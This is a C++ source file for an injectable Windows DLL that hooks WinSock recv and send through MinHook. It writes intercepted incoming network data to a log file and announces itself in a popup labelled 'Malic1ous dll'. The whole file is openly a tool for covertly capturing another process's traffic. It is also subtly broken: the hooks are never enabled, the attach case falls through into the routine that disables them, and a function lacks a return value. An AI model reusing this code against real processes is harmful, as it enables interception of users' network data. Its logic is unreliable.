/*
DLL to hook WinSock recv and send calls
The code simply writes the bytes from recv and send to
a file "winsock_hook_recv.log"

Requires MinHook library from Tsuda Kageyu, tsuda.kageyu@gmail.com
https://github.com/TsudaKageyu/minhook
    
Created by Ernesto Vazquez
*/
#include "pch.h"
#include <Windows.h>
#include <string>
#include <WinSock2.h>
#include "..\include\MinHook.h"

#pragma comment(lib, "libMinHook.x64.lib")
#pragma comment(lib, "Ws2_32.lib")

int (WINAPI* precv)(SOCKET socket, char* buffer, int length, int flags) = NULL;
int (WINAPI* psend)(SOCKET socket, const char* buffer, int length, int flags) = NULL;
typedef void (WINAPI* PGNSI)(LPSYSTEM_INFO);
PGNSI orecv;
PGNSI osend;
HANDLE hFile;

BOOL setup_log() {
    hFile = CreateFile(L"C:\\Injector\\winsock_hook_recv.log", GENERIC_WRITE, 0, NULL,
        CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }
    return true;
}
int WINAPI Hooked_Recv(SOCKET socket, char* buffer, int length, int flags)
{
    DWORD bytes_written;
    if (hFile == NULL) {
        setup_log();
    }
    WriteFile(hFile, buffer, length, &bytes_written, NULL);
    return precv(socket, buffer, length, flags);
}

int WINAPI Hooked_Send(SOCKET socket, const char* buffer, int length, int flags)
{
    return psend(socket, buffer, length, flags);
}

BOOL setup_hook() {
    HMODULE ws2dll = GetModuleHandle(L"Ws2_32.dll");
    orecv =  (PGNSI)GetProcAddress(ws2dll, "recv");
    osend = (PGNSI)GetProcAddress(ws2dll, "send");

    if (MH_Initialize() != MH_OK) {
        return false;
    }
    if (MH_CreateHook(orecv, &Hooked_Recv, (LPVOID *)&precv) != MH_OK) {
        return false;
    } 
    if (MH_CreateHook(osend, &Hooked_Send, (LPVOID*)&psend) != MH_OK) {
        return false;
    }
    if (!setup_log()) {
        return false;
    }
    return true;
}

BOOL disable_hook() {
    MH_DisableHook(orecv);
    MH_DisableHook(osend);
    MH_Uninitialize();
    CloseHandle(hFile);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    DWORD dwPID = GetCurrentProcessId();
    TCHAR szFileName[MAX_PATH + 1];
    GetModuleFileName(NULL, szFileName, MAX_PATH + 1);

    std::wstring message = L"Hi!! I just h00ked you :P \n\nPID = " + std::to_wstring(dwPID);
    message = message + L"\nName = " + szFileName;

    
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (setup_hook()) {
            ::MessageBox(NULL, message.c_str(), L"Malic1ous dll", MB_OK);
        }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        (void)disable_hook();
        break;
    }
    return TRUE;
}

